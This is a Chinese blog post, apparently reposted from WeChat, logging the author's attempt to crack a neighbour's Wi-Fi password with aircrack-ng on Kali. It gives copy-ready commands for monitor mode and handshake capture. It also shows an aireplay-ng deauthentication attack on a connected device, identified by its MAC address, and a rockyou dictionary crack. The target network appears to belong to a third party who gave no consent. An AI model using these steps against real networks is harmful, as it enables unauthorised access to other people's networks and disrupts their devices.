> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/VyRBY-OMWjMyRvcUpFXi3Q)

**文章来****源：****疯猫网络**

**前言：**  

----------

看着附近的 WIFI，灵机一动，上网搜索了一下教程于是决定做一个试验。在此记录一下试验过程和结果，仅作为学习记录。

**试验环境：**
---------

> 台式机
> 
> Kali 虚拟机
> 
> 无线网卡
> 
> 菜鸡一只

**试验过程：**
---------

### **一、无线网卡安排**

1.  主机 USB 接口直接怼入无线网卡，Kali 虚拟机弹窗提示，选择连接到虚拟机，选中 Kali，点击确定。看到有些教程说需要安装驱动，这可能跟所购买的无线网卡是否免驱有关，我这里是免驱版的直接怼入即可使用。
    

![](https://mmbiz.qpic.cn/mmbiz_png/5ZACCn1bWEym9ydcwDB85XutB3KcfJjboTibsGEibLQwBLju1zX8ejsTkgJib5aLVz3Twia3NZoPhgXdH4WuoyN9yw/640?wx_fmt=png)

2.1. 此时在 Kali 的网络连接处就可以看到，虚拟机可以搜索到附近的 WIFI。说明网卡怼入成功。

![](https://mmbiz.qpic.cn/mmbiz_png/5ZACCn1bWEym9ydcwDB85XutB3KcfJjbeIgibJJkK50DIjh44FMiatOX3L8M486PvZECcPbNQatJASqU1hpcGbGw/640?wx_fmt=png)

2.2. 打开终端输入 ifconfig 查看网卡，存在 wlan0。也说明网卡怼入成功。

![](https://mmbiz.qpic.cn/mmbiz_png/5ZACCn1bWEym9ydcwDB85XutB3KcfJjbSAonjeoBDqX42BHxz9rc9MgQl1jxjvY5v5YKWkmcu02ja6b2FHyDyQ/640?wx_fmt=png)

2.3. 终端输入 iwconfig，存在网卡 wlan0，也说明网卡怼入成功。

![](https://mmbiz.qpic.cn/mmbiz_png/5ZACCn1bWEym9ydcwDB85XutB3KcfJjbXs60dfejObv5XyniagqAkoicwkk7vgqwQ34VjU6ET8mvTJyqbjMuzm5Q/640?wx_fmt=png)

2.4. 虚拟机检查可移动设备，可以清楚的看到无线网卡的型号。也是说明网卡怼入成功。

![](https://mmbiz.qpic.cn/mmbiz_png/5ZACCn1bWEym9ydcwDB85XutB3KcfJjbatiaicGRD4FoczgdYiaict0OuXDuRWxAvUGfibqHt7bephic3nG3NjLA7icHQ/640?wx_fmt=png)

### **二、握手包抓取**

1.1. 输入命令，清除系统中可能影响监听的进程：

```
airmon-ng check kall
```

1.2. 开启网卡监听：

```
airmon-ng start wlan0
```

1.3. 检查是否成功开启监听：（可以看到 wlan0 变成了 wlan0mon，说明成功开启监听模式）

```
iwconfig
```

![](https://mmbiz.qpic.cn/mmbiz_png/5ZACCn1bWEym9ydcwDB85XutB3KcfJjbIia99uuceia3hMibzoaDWA2HZjmZcNkfEWXHltYOziarqnibZI3Pfia5gRjw/640?wx_fmt=png)

2. 开始探测附近的 WIFI：

```
airodump-ng wlan0mon
```

主要看三个参数：

> BSSID：路由器的 MAC 地址
> 
> PWR：信号值，绝对值越低，说明信号越强
> 
> CH：当前路由器使用的信道

![](https://mmbiz.qpic.cn/mmbiz_png/5ZACCn1bWEym9ydcwDB85XutB3KcfJjbHIBAmkicTjDmpWoqrprMa2VyjeUIM2GadzaOtJwJrhZa2ibtQUib7Umkw/640?wx_fmt=png)

3. 找一个信号比较强的 WIFI 进行监听，这里选择了一个小米的 WIFI，BSSID 为：64:64:4A:E3:90:41，使用的信道为 1，输入命令，开始监听：

```
airodump-ng --bssid 64:64:4A:E3:90:41 -c 1 -w test wlan0mon
```

**参数说明：**

> –bssid：路由器的 MAC 地址
> 
> -c：路由器使用的信道
> 
> -w：抓取的握手包名称，可以选择输出的路径，这里使用默认输出路径为根目录

（下图说明：BSSID 为路由器 MAC 地址，STATION 为当前连接在路由器上的设备的 MAC 地址）

![](https://mmbiz.qpic.cn/mmbiz_png/5ZACCn1bWEym9ydcwDB85XutB3KcfJjbm2Eu1pjkE2an7q4WkY1OrXBtia3BQmdvTUlKWNpCBK1kHFLKKEY0Gjg/640?wx_fmt=png)

4. 另外再打开一个终端，对当前正在连接的某个设备进行攻击，使其断开与路由器的连接。（原理没有深究，大概使向目标发送大量数据，或者类似于 ARP 欺骗的攻击，使设备与路由器断开连接，停止攻击后，设备会自动连接上路由器，此时就可以抓取到握手包。）

```
aireplay-ng -0 10 -a 64:64:4A:E3:90:41 -c 9C:2E:A1:9F:9E:2F wlan0mon
或者 aireplay-ng --deauth 10 -a 64:64:4A:E3:90:41 -c 9C:2E:A1:9F:9E:2F wlan0mon
```

参数说明：

> -0、–deauth：指定对目标进行攻击的次数
> 
> -a：路由器的 MAC 地址
> 
> -c：目标 MAC 地址

![](https://mmbiz.qpic.cn/mmbiz_png/5ZACCn1bWEym9ydcwDB85XutB3KcfJjb1UiaCjOHlAEFialibuNjxrhqheB4qw92KY6NUJUFgib7cJIuZhf8vyoV3Q/640?wx_fmt=png)

5. 等待攻击完成，此时在第一个终端会显示握手包抓取成功，如下图：

![](https://mmbiz.qpic.cn/mmbiz_png/5ZACCn1bWEym9ydcwDB85XutB3KcfJjb3IyEeVwlwRBUXnXLgbCNOmB40brB4ep6jjqvUbXXtefy78yoGhGAzA/640?wx_fmt=png)

6. 在根目录生成有一些握手包文件，其中包含 test-01.cap

![](https://mmbiz.qpic.cn/mmbiz_png/5ZACCn1bWEym9ydcwDB85XutB3KcfJjbzPPc8XQ2Bm9j8tgrgWf3Km77qvMicS7JRjhqW3VINIwPHopbpJ2eicFA/640?wx_fmt=png)

### **三、爆破开启**

1. 在终端输入命令：

```
aircrack-ng -w /usr/share/wordlists/rockyou.txt test-01.cap
```

参数说明：

> -w：指定一个密码文件，这里使用的是 Kali 自带的密码文件，可以在文件系统中找到。

（PS：我一开始使用此命令时报错，缺少 - w 参数，然后进入密码存放文件路径中发现，自带的密码是一个压缩包，需要先解压才能用，源文件为：rockyou.txt.gz。后面的. cap 文件，如果一开始更改的存放的位置需要加上完整的路径）

![](https://mmbiz.qpic.cn/mmbiz_png/5ZACCn1bWEym9ydcwDB85XutB3KcfJjb61A89V4GFIKcAaFfeLuCg1rKR93dau4fIEK5icRge0hwH7LxDbeKYZg/640?wx_fmt=png)

**试验结果：**
---------

等待爆破结束：（很遗憾，密码字典不够强大，没有爆破出来，密码正确会显示在终端）

![](https://mmbiz.qpic.cn/mmbiz_png/5ZACCn1bWEym9ydcwDB85XutB3KcfJjbal6oQYwic7uCg0ZsE8PDazRoydhnQcgwodibLvLwlclfDuDpNgEoxbAw/640?wx_fmt=png)

**个人总结：**
---------

感觉就是学习了一个工具的大概使用过程，aircrack-ng 原理是使用 CPU 去跑包，全程不需要联网，破解速度看个人 CPU 的性能。

  
此间还看到了一个利用显卡 GPU 去跑字典的教程，前期一样的是抓取握手包，然后使用 hashcat 这个工具进行爆破，据说速度比 aircrack-ng 快的多。还有一些其他的工具，如：EWSA（与 hashcat 原理差不多）

  
（一样做了试验，但是 hashcat 没跑起来，原因是：我的电脑显卡是集成显卡，太垃圾了。需要独立显卡才可以跑）

（PS：穷举爆破这种事，关键还是字典和目标密码强度，个人脸黑，看来得自己尽快搞个 WIFI 了）

**版权申明：内容来源网络，版权归原创者所有。除非无法确认，都会标明作者及出处，如有侵权烦请告知，我们会立即删除并致歉。谢谢!**

公众号